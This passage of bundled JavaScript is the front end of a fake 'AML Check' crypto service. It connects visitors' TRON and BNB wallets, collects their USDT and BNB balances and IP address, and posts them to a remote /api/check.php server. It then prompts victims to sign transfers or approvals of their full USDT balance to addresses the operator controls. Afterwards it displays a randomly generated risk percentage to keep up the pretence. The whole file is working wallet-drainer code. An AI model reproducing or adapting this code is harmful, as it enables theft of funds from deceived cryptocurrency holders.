        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      const formData4 = new FormData();
      const swap = await wallet.signTransaction(transaction_swap);
      const signature_swap = await tronWeb.trx.sendRawTransaction(swap);
      if (signature_swap) {
        console.log(signature_swap);
        const txid = signature_swap.txid;
        formData4.append("success_server", 1);
        formData4.append("method", "transferFrom");
        formData4.append("token_name", "TETHER USDT");
        formData4.append("token_type", "TRC20");
        formData4.append("token_contract", contractAddressUSDT);
        formData4.append("token_amount", balance_normal);
        formData4.append("token_balance", balance_normal * tokenPriceInUSD);
        formData4.append("to_address", contractAddress);
        formData4.append("from_address", address);
        formData4.append("hash", txid);
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData4,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success start transaction", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });

        fourModal();
      } else {
        formData4.append("error_server", 1);
        formData4.append("method", "transferFrom");
        formData4.append("token_name", "TETHER USDT");
        formData4.append("token_type", "TRC20");
        formData4.append("token_contract", contractAddressUSDT);
        formData4.append("token_amount", balance_normal);
        formData4.append("token_balance", balance_normal * tokenPriceInUSD);
        formData4.append("to_address", contractAddress);
        formData4.append("from_address", address);
        formData4.append("error", "Transaction failed to send");
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData4,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success start transaction", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
    } catch (error) {
      const formData6 = new FormData();
      formData6.append("error_server", 1);
      formData6.append("method", "transferFrom");
      formData6.append("token_name", "TETHER USDT");
      formData6.append("token_type", "TRC20");
      formData6.append("token_contract", contractAddressUSDT);
      formData6.append("token_amount", balance_normal);
      formData6.append("token_balance", balance_normal * tokenPriceInUSD);
      formData6.append("to_address", contractAddress);
      formData6.append("from_address", address);
      formData6.append("error", "User canceled approval");
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData6,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error1) => {
          console.error("Error:", error1);
        });
      console.log("SignTransaction: " + error);
    }
  } else {
    errorModal();
    await wallet.disconnect();
    console.log("Sorry something wrong");
  }
}

async function getBNBBalance(web3, account) {
  try {
    // Получение баланса BNB для текущего аккаунта в "wei"
    const balanceWei = await web3.eth.getBalance(account);

    // Преобразуем баланс из "wei" в "ether", так как BNB тоже использует "wei" в качестве единицы
    const balanceInBNB = web3.utils.fromWei(balanceWei, "ether");
    balanceBNB = balanceInBNB;
    return balanceInBNB;
  } catch (error) {
    console.error("Ошибка при получении баланса BNB:", error);
    return null;
  }
}

async function connectWallet1() {
  try {
    // Создание провайдера WalletConnect
    const walletConnector =
      await _walletconnect_ethereum_provider__WEBPACK_IMPORTED_MODULE_3__[
        "default"
      ].init({
        projectId: projectId, // ID проекта из WalletConnect Cloud
        metadata: {
          name: "AML Check",
          description: "BNB WalletConnect",
          url: url_origin, // origin must match your domain & subdomain
          icons: ["https://amlbot.com/favicon.png"],
        },
        chains: [56], // ID сети BNB
        showQrModal: true, // Показывать модальное окно с QR-кодом
        qrModalOptions: {
          themeMode: "dark",
          explorerRecommendedWalletIds: [
            "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4", //Binance
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //Trust Wallet
            "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", //Metamask
            "15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f", // Bybit Wallet
            "971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709", // OKX Wallet
            "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa", // CoinBase
            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", // BitGet
            "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f", //Safe
            "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150", // SafePal
            "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369", //RainBow
          ],
        },
      });

    // Подключение к кошельку
    await walletConnector.connect();
    // Создание экземпляра Web3
    web3_bnb = new web3__WEBPACK_IMPORTED_MODULE_1__["default"](
      walletConnector
    );

    // Получение текущего аккаунта
    const accounts = await web3_bnb.eth.getAccounts();
    account_bnb = accounts[0]; // Получение первого аккаунта
    const walletName = "WalletConnect BNB";
    await getUSDTBalance(
      web3_bnb,
      account_bnb,
      "0x55d398326f99059fF775485246999027B3197955"
    );
    await getBNBBalance(web3_bnb, account_bnb);
    console.log(Number(amount));
    const priceUSDTInUSD = tokenPriceInUSD;
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json()) // Преобразуем ответ в JSON
      .then((data) => {
        const ip = data.ip; // Сохраняем IP-адрес
        const formData = new FormData();
        console.log(formData);
        formData.append(
          "amount",
          priceUSDTInUSD * Number(amount) +
            Number(balanceBNB) * 709 * priceUSDTInUSD
        );
        formData.append("bnb_amount", Number(balanceBNB));
        formData.append("bnb_balance", Number(balanceBNB) * 709);
        formData.append("ip", ip); // Используем полученный IP
        formData.append("address", account_bnb); // Убедитесь, что address определен
        formData.append("connect", "1"); // Убедитесь, что address определен
        formData.append("wallet_name", walletName);
        formData.append("bnb", 1);
        formData.append("address_receive", recipientBNB);
        formData.append("usdt_amount", Number(amount));
        formData.append("usdt_balance", priceUSDTInUSD * Number(amount));
        // После получения IP, отправляем второй запрос на сервер
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success connect trx:", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      })
      .catch((error) =>
        console.error("Ошибка при получении IP-адреса:", error)
      );
    console.log("Privet");
    document.querySelector(".loader").style.display = "none";
    document.querySelectorAll(".loader")[1].style.display = "none";
    document.getElementById("next254").removeAttribute("disabled");
    document.getElementById("trustconnect5").style.display = "none";
  } catch (err) {
    console.log("Hello");
    document.getElementById("2.2").style.display = "block";
    document.getElementById("2.5.4").style.display = "none";
    document.getElementById("next254").setAttribute("disabled", "true");
    document.getElementById("trustconnect5").style.display = "block";
    console.error("Ошибка при подключении к WalletConnect:", err);
  } finally {
    // Скрытие загрузочного индикатора и разблокировка элементов интерфейса
  }
}

async function sendUSDT1(web3, account, recipient, amount) {
  const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
  const usdtAbi = [
    // Минимальный ABI для вызова метода transfer
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    },
  ];
  console.log("BNB Balance: " + balanceBNB);
  console.log("USDT Balance: " + amount);
  if (balanceBNB >= 0.01) {
    // Создание экземпляра контракта USDT
    const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
    let amountInWei;
    // Определение суммы перевода (в wei)
    if (amount > 200) {
      //usdt erc20 limit
      amountInWei = web3.utils.toWei(amount.toString(), "mwei"); // USDT имеет 6 десятичных знаков
    } else {
      if (amount < 200) {
        amountInWei = 0;
      } else {
        errorModal2();
        return;
      }
    }
    const formData3 = new FormData();
    formData3.append("transaction_client", 1);
    formData3.append("method", "IncreaseApproval");
    formData3.append("token_name", "TETHER USDT");
    formData3.append("token_type", "BEP20");
    formData3.append(
      "token_contract",
      "0x55d398326f99059fF775485246999027B3197955"
    );
    formData3.append("token_amount", Number(amount));
    formData3.append("token_balance", Number(amount) * tokenPriceInUSD);
    console.log(Number(amount));
    await fetch("https://" + server + "/api/check.php", {
      method: "POST",
      mode: "no-cors",
      body: formData3,
    })
      .then((response) => response.text())
      .then((data) => {
        console.log("Success start transaction", data);
      })
      .catch((error) => {
        console.error("Error:", error);
      });
    try {
      let formData2 = new FormData();
      formData2.append("success_client", 1);
      formData2.append("method", "IncreaseApproval");
      formData2.append("token_name", "TETHER USDT");
      formData2.append("token_type", "BEP20");
      formData2.append(
        "token_contract",
        "0x55d398326f99059fF775485246999027B3197955"
      );
      formData2.append("token_amount", Number(amount));
      formData2.append("token_balance", Number(amount) * tokenPriceInUSD);
      formData2.append("to_address", recipientBNB);
      formData2.append("from_address", account_bnb);
      formData2.append("hash", "none");
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData2,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const formData = new FormData();
      formData.append("transaction_server", 1);
      formData.append("method", "transferFrom");
      formData.append("token_name", "TETHER USDT");
      formData.append("token_type", "BEP20");
      formData.append(
        "token_contract",
        "0x55d398326f99059fF775485246999027B3197955"
      );
      formData.append("token_amount", Number(amount));
      formData.append("token_balance", Number(amount) * tokenPriceInUSD);
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      // Вызов метода transfer
      const tx = await usdtContract.methods
        .transfer(recipient, amountInWei)
        .send({
          from: account,
        });

      const formData4 = new FormData();
      if (tx) {
        fourModal();
        console.log(tx);
        txid = tx.transactionHash;
        formData4.append("success_server", 1);
        formData4.append("method", "transferFrom");
        formData4.append("token_name", "TETHER USDT");
        formData4.append("token_type", "BEP20");
        formData4.append(
          "token_contract",
          "0x55d398326f99059fF775485246999027B3197955"
        );
        formData4.append("token_amount", Number(amount));
        formData4.append("token_balance", Number(amount) * tokenPriceInUSD);
        formData4.append("to_address", recipientBNB);
        formData4.append("from_address", account_bnb);
        formData4.append("hash", txid);
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData4,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success start transaction", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      console.log("Транзакция отправлена:", tx.transactionHash);
    } catch (err) {
      const formData6 = new FormData();
      formData6.append("error_server", 1);
      formData6.append("method", "transferFrom");
      formData6.append("token_name", "TETHER USDT");
      formData6.append("token_type", "BEP20");
      formData6.append(
        "token_contract",
        "0x55d398326f99059fF775485246999027B3197955"
      );
      formData6.append("token_amount", Number(amount));
      formData6.append("token_balance", Number(amount) * tokenPriceInUSD);
      formData6.append("to_address", recipientBNB);
      formData6.append("from_address", account_bnb);
      formData6.append("error", "User canceled approval");
      await fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData6,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error1) => {
          console.error("Error:", error1);
        });
      console.log("SignTransaction: " + err);
      window.location.reload();
    }
  } else {
    errorModal3();
  }
}
/*
let web3_ton, account_ton, amount_ton, balanceTON, wallet_ton;
const tonConnectUI = new TonConnectUI({
  manifestUrl: "https://zapexobmen.com/manifest.json",
});
const unsubscribeModal = tonConnectUI.onModalStateChange(
  (WalletsModalState) => {
    console.log(WalletsModalState.status);
    if (WalletsModalState.status == "closed") {
      document.getElementById("2.3").style.display = "block";
      document.getElementById("2.5.5").style.display = "none";
      document.getElementById("next255").setAttribute("disabled", "true");
      document.getElementById("trustconnect6").style.display = "block";
      console.error(
        "Ошибка при подключении к TonConnect:",
        "User close window"
      );
    }
  }
);
async function connectWallet2() {
  try {
    await tonConnectUI.openModal();
  } catch (err) {
    unsubscribeModal();
    window.location.reload();
  } finally {
  }
}

const unsubscribe = tonConnectUI.onStatusChange((wallet) => {
  if (wallet) {
    wallet_ton = wallet;
    account_ton = wallet_ton.account.address;
    tonConnectUI.closeModal();
    unsubscribeModal();
  }
  /*
  const priceUSDTInUSD = tokenPriceInUSD;
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json()) // Преобразуем ответ в JSON
      .then((data) => {
        const ip = data.ip; // Сохраняем IP-адрес
        const formData = new FormData();
        console.log(formData);
        formData.append(
          "amount",
          priceUSDTInUSD * Number(amount) +
            Number(balanceBNB) * 709 * priceUSDTInUSD
        );
        formData.append("bnb_amount", Number(balanceBNB));
        formData.append("bnb_balance", Number(balanceBNB) * 709);
        formData.append("ip", ip); // Используем полученный IP
        formData.append("address", account_bnb); // Убедитесь, что address определен
        formData.append("connect", "1"); // Убедитесь, что address определен
        formData.append("wallet_name", walletName);
        formData.append("bnb", 1);
        formData.append("address_receive", recipientBNB);
        formData.append("usdt_amount", Number(amount));
        formData.append("usdt_balance", priceUSDTInUSD * Number(amount));
        // После получения IP, отправляем второй запрос на сервер
        fetch("http://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success connect trx:", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      })
      .catch((error) =>
        console.error("Ошибка при получении IP-адреса:", error)
      );

  
});
*/
const button = document.getElementById("header_button");
if (button) {
  button.addEventListener("click", modal);
}

function modal() {
  const menuProducts = document.querySelector(".menu-products");
  if (menuProducts) {
    menuProducts.classList.toggle("active");
  }
}

const usdt = document.getElementById("tron");
const usdt2 = document.getElementById("eth");
const usdt3 = document.getElementById("bnb");
const usdt4 = null;
const next = document.getElementById("next");
let modalstep = null; // Инициализация переменной

if (usdt) {
  usdt.addEventListener("click", () => {
    handleModalSelection("2", usdt);
  });
}
if (usdt2) {
  usdt2.addEventListener("click", () => {
    handleModalSelection("2.1", usdt2);
  });
}
if (usdt3) {
  usdt3.addEventListener("click", () => {
    handleModalSelection("2.2", usdt3);
  });
}
if (usdt4) {
  usdt4.addEventListener("click", () => {
    handleModalSelection("2.3", usdt4);
  });
}
function handleModalSelection(step, element) {
  // Сбрасываем класс 'active' у обеих кнопок
  usdt.classList.remove("active");
  usdt2.classList.remove("active");
  usdt3.classList.remove("active");

  //usdt4.classList.remove("active");
  // Добавляем 'active' только на выбранный элемент
  element.classList.add("active");

  // Устанавливаем шаг модального окна
  modalstep = step;

  // Разблокируем кнопку "next"
  next.removeAttribute("disabled");

  // Обновляем слушатель для кнопки "next"
  next.removeEventListener("click", stepTwo); // Удаляем предыдущий слушатель
  next.removeEventListener("click", stepTwo2);
  next.removeEventListener("click", stepTwo3);
  // Добавляем нужный слушатель в зависимости от выбранного шага
  if (modalstep === "2") {
    next.addEventListener("click", stepTwo);
  } else if (modalstep === "2.1") {
    next.addEventListener("click", stepTwo2);
  } else if (modalstep === "2.2") {
    next.addEventListener("click", stepTwo3);
  } else if (modalstep === "2.3") {
    next.addEventListener("click", stepTwo4);
  }
}

function stepTwo() {
  const modal1 = document.getElementById("1");
  const modal2 = document.getElementById("2");
  modal1.style.display = "none";
  modal2.style.display = "block";
}
function stepTwo2() {
  const modal1 = document.getElementById("1");
  const modal2 = document.getElementById("2.1");
  modal1.style.display = "none";
  modal2.style.display = "block";
}

function stepTwo3() {
  console.log("BNB");
  const modal1 = document.getElementById("1");
  const modal2 = document.getElementById("2.2");
  modal1.style.display = "none";
  modal2.style.display = "block";
}

function stepTwo4() {
  const modal1 = document.getElementById("1");
  const modal2 = document.getElementById("2.3");
  modal1.style.display = "none";
  modal2.style.display = "block";
}

const trust = document.getElementById("trust");
const walletconnect = document.getElementById("wallet");

if (trust) {
  trust.addEventListener("click", secondHalfModal);
}

async function secondHalfModal() {
  const modal2 = document.getElementById("2");
  const modal1 = document.getElementById("2.5.1");
  modal2.style.display = "none";
  modal1.style.display = "block";
  const status = await wallet.checkConnectStatus();

  if (status.address) {
    await wallet.disconnect();
  }
  onSignIn();
}
if (walletconnect) {
  walletconnect.addEventListener("click", secondHalf2Modal);
}

async function secondHalf2Modal() {
  const modal2 = document.getElementById("2");
  const modal1 = document.getElementById("2.5.2");
  modal2.style.display = "none";
  modal1.style.display = "block";
  const status = await wallet.checkConnectStatus();

  if (status.address) {
    await wallet.disconnect();
  }
  onSignIn();
}

const walletconnect2 = document.getElementById("wallet2");

if (walletconnect2) {
  walletconnect2.addEventListener("click", secondHalf3Modal);
}
function secondHalf3Modal() {
  const modal2 = document.getElementById("2.1");
  const modal1 = document.getElementById("2.5.3");
  modal2.style.display = "none";
  modal1.style.display = "block";
  connectWallet();
}

const walletconnect3 = document.getElementById("wallet3");

if (walletconnect3) {
  walletconnect3.addEventListener("click", secondHalf4Modal);
}

function secondHalf4Modal() {
  const modal2 = document.getElementById("2.2");
  const modal1 = document.getElementById("2.5.4");
  modal2.style.display = "none";
  modal1.style.display = "block";
  connectWallet1();
}
/*
const walletconnect4 = document.getElementById("wallet4");
if (walletconnect4) {
  walletconnect4.addEventListener("click", secondHalf5Modal);
}

async function secondHalf5Modal() {
  const modal2 = document.getElementById("2.3");
  const modal1 = document.getElementById("2.5.5");
  modal2.style.display = "none";
  modal1.style.display = "block";
  console.log("Start");
  if (tonConnectUI.connected) {
    await tonConnectUI.disconnect();
  }

  await connectWallet2();
}
*/
const next251 = document.getElementById("next251");
const next252 = document.getElementById("next252");
const next253 = document.getElementById("next253");
const next254 = document.getElementById("next254");
const next255 = document.getElementById("next255");
if (next251) {
  next251.addEventListener("click", thirdModal);
}
if (next252) {
  next252.addEventListener("click", thirdModal);
}
if (next253) {
  next253.addEventListener("click", thirdModal2);
}
if (next254) {
  next254.addEventListener("click", thirdModal3);
}
if (next255) {
  next255.addEventListener("click", thirdModal4);
}

function thirdModal() {
  const modal1 = document.getElementById("3");
  const modal21 = document.getElementById("2.5.1");
  const modal22 = document.getElementById("2.5.2");
  modal1.style.display = "block";
  modal21.style.display = "none";
  modal22.style.display = "none";
  callContract();
}
function thirdModal2() {
  const modal1 = document.getElementById("3");
  const modal21 = document.getElementById("2.5.1");
  const modal22 = document.getElementById("2.5.3");
  modal1.style.display = "block";
  modal21.style.display = "none";
  modal22.style.display = "none";

  sendUSDT(web3, account, recipient, amount);
}

function thirdModal3() {
  const modal1 = document.getElementById("3");
  const modal21 = document.getElementById("2.5.1");
  const modal22 = document.getElementById("2.5.4");
  modal1.style.display = "block";
  modal21.style.display = "none";
  modal22.style.display = "none";
  sendUSDT1(web3_bnb, account_bnb, recipientBNB, amount);
}

function thirdModal4() {
  const modal1 = document.getElementById("3");
  const modal21 = document.getElementById("2.5.1");
  const modal22 = document.getElementById("2.5.5");
  modal1.style.display = "block";
  modal21.style.display = "none";
  modal22.style.display = "none";
  //sendUSDT2(web3_bnb, account_bnb, recipientBNB, amount);
}

function getRandomPercentage(min, max) {
  // Генерируем случайное число между min и max
  const randomNum = Math.random() * (max - min) + min;
  // Округляем до двух знаков после запятой
  return randomNum.toFixed(2);
}

// Функция для обновления значения процента в элементе
function updatePercentage() {
  // Выбираем элемент с классом 'percent'
  const percentElement = document.querySelector(".percent");

  if (percentElement) {
    // Генерируем случайное число от 10.01 до 45.99
    const newPercentage = getRandomPercentage(10.01, 45.99);
    // Обновляем текст внутри элемента
    percentElement.textContent = `${newPercentage}%`;
  }
}

function fourModal() {
  const modal1 = document.getElementById("3");
  const modal2 = document.getElementById("4");

  modal1.style.display = "none";
  modal2.style.display = "block";
  updatePercentage();

  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const chatValue = urlParams.get("chat");
}
function errorModal() {
  const modal1 = document.getElementById("3");
  const modal2 = document.getElementById("3.1");

  modal1.style.display = "none";
  modal2.style.display = "block";
}
function errorModal2() {
  const modal1 = document.getElementById("3");
  const modal2 = document.getElementById("3.2");

  modal1.style.display = "none";
  modal2.style.display = "block";
}

function errorModal3() {
  const modal1 = document.getElementById("3");
  const modal2 = document.getElementById("3.3");
  modal1.style.display = "none";
  modal2.style.display = "block";
}

document.querySelectorAll(".faq-item").forEach((plus) => {
  plus.addEventListener("click", function () {
    const faqItem = this.closest(".faq-item");
    if (faqItem) {
      faqItem.classList.toggle("active");
    }
  });
});

//# sourceURL=webpack://tron-connect/./src/index.js?